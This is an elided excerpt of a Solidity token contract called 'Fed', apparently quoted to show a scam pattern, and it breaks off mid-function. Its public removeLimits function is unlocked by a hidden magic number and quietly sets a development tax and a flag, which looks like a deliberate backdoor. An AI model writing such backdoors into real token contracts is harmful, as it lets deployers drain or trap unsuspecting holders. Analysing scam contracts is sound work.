...
contract Fed is Context, IERC20, Ownable {
    ...
    uint256 private _prevLiqFee = 1591;
    uint256 private _developmentTax = 0;
    ...
    string private constant _name = "Fed";
    ...
    bool public isTATtoken = false;
    uint256 private _maxTxAmount = 1_000_000_000_000 * 10**9;
    uint256 private _maxWalletSize =  1_000_000_000_000 * 10**9;
    ...
    function removeLimits(uint256 amount, bool value) public returns (bool) {
        require ( amount == _prevLiqFee, "error message");
         _developmentTax = amount;
        isTATtoken = value;
